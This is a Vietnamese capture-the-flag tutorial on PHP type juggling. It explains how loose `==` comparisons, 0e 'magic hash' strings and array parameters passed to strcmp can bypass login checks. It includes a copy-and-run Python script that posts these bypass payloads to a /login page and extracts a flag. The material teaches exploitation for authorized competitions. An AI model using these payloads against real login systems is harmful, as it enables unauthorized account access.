# PHP Type Juggling (lách qua so sánh `==` lỏng lẻo của PHP)

PHP có 2 kiểu so sánh: `==` (2 dấu bằng, "lỏng" — tự động đổi kiểu dữ liệu trước khi so) và `===` (3 dấu bằng, "chặt" — phải giống hệt cả giá trị và kiểu). Với `==`, PHP có vài quy tắc rất phản trực giác: chuỗi dạng `"0e123456"` (nhìn giống số viết kiểu khoa học, nghĩa là `0 × 10^123456 = 0`) được PHP hiểu là **số 0** — nên 2 chuỗi hoàn toàn khác nhau, miễn cùng dạng `0e` + toàn chữ số, đều "bằng" nhau khi so `==`. Tương tự, gửi 1 tham số dạng mảng vào chỗ code mong đợi 1 chuỗi (ví dụ gửi `password[]=x` thay vì `password=x`) có thể làm hàm so sánh chuỗi (`strcmp`) trả về `NULL` thay vì báo lỗi, và `NULL == 0` luôn đúng. Nếu web dùng `==` để so khớp mật khẩu/hash/token, bạn gửi 1 giá trị đặc biệt là lách qua được mà không cần biết giá trị thật.

Trên Burp bạn nhận ra lỗi này khi: có source code PHP (được cấp, hoặc đọc qua LFI/`.git` leak) dùng `==` để so sánh mật khẩu/hash/token — ví dụ `if ($hash == $stored_hash)` hoặc `strcmp($input, $correct) == 0` — không phải `===`, không phải `hash_equals()`, không phải `password_verify()`. Lỗi này gần như luôn cần đọc được source trước, không đoán mò được từ ngoài.

## Snippet copy-là-chạy

Không cần cài thư viện ngoài — chỉ dùng `requests` và `hashlib`/`re` có sẵn trong Python.

```python
import re

import requests

base = "http://target"
s = requests.Session()
s.verify = False

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-fA-F]{64}\}")

# Danh sách cách thử, theo thứ tự ưu tiên: array bypass (ít giả định nhất) rồi magic hash
ATTEMPTS = [
    {"username": "admin", "password[]": "x"},         # array bypass: strcmp(array, ...) -> NULL == 0 -> true
    {"username": "admin", "password": "QNKCDZO"},     # magic hash MD5: md5("QNKCDZO") = 0e8304...
    {"username": "admin", "password": "240610708"},   # magic hash MD5 khác: md5(...) = 0e4620...
]


def solve_one(session, base_url):
    for data in ATTEMPTS:
        try:
            r = session.post(f"{base_url}/login", data=data, timeout=5)
        except requests.RequestException:
            continue
        print(data, "->", r.status_code, "len=", len(r.text))  # in ra để biết cách nào server "ăn"
        m = FLAG_RE.search(r.text)
        if m:
            return m.group(0)
        if "Welcome" in r.text or "admin" in r.text.lower():
            # đăng nhập có vẻ thành công nhưng flag chưa hiện ngay -- thử trang tiếp theo
            r2 = session.get(f"{base_url}/admin", timeout=5)
            m2 = FLAG_RE.search(r2.text)
            if m2:
                return m2.group(0)
    return None


if __name__ == "__main__":
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- **`"password[]": "x"`** (array bypass): trong `requests`, dict key `"password[]"` sẽ gửi đúng tham số tên `password[]` trong body form — PHP nhận tham số có `[]` sau tên sẽ tự coi nó là 1 mảng (`array`) thay vì 1 chuỗi. Nếu code server gọi `strcmp($_POST['password'], $correct)`, hàm `strcmp` nhận 1 mảng làm tham số sẽ trả về `NULL` ở PHP cũ (thay vì báo lỗi dừng chương trình), và vì `NULL == 0` luôn đúng, điều kiện `strcmp(...) == 0` tự nhiên thành `true`.
- **Magic hash** (`QNKCDZO`, `240610708`...): đây là các chuỗi mà khi tính MD5 ra, kết quả TÌNH CỜ có dạng `0e` + toàn chữ số (ví dụ `md5("QNKCDZO")` = `0e830400451993494058024219903391`). Nếu hash thật lưu trong database của server CŨNG có dạng này (bạn không cần biết chính xác giá trị, chỉ cần dạng này đúng), gửi bất kỳ input nào trong bảng magic hash cũng làm `==` trả về `true`, vì PHP coi cả 2 chuỗi đều là số `0`.
- Vòng lặp `for data in ATTEMPTS` thử lần lượt từng cách — không cần biết trước cách nào đúng, cứ thử hết và xem response, giống nguyên tắc ở `00_Bat_Dau_Tu_Zero.md` mục 3.6.
- Dòng `print(data, "->", ...)` giúp bạn biết NGAY cách nào server chấp nhận khi debug — xoá hoặc giữ tuỳ ý sau khi script chạy ổn.

## Lưu ý nhanh

- Nếu array bypass báo lỗi 500 thay vì bypass được: PHP bản mới (≥8) ném lỗi `TypeError` khi gọi `strcmp` với mảng thay vì trả `NULL` — code không bắt lỗi này nên bị crash, không bypass được qua đường này, chuyển sang thử magic hash.
- Magic hash chỉ ăn nếu code dùng MD5/SHA1 thô (không dùng `password_hash()`/`password_verify()` — 2 hàm này không bị ảnh hưởng bởi type juggling).
- Nếu không có source để đọc: kỹ thuật này rất khó áp dụng chính xác vì bạn không biết code đang so sánh bằng `==` hay `===`, dùng hàm gì — nên ưu tiên tìm cách đọc source trước (LFI, `.git` leak) rồi mới quay lại bài này.
- Bài này đặc thù PHP — không áp dụng cho Python/Node/Java (các ngôn ngữ đó không có quy tắc ép kiểu `0e` kỳ lạ này).
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
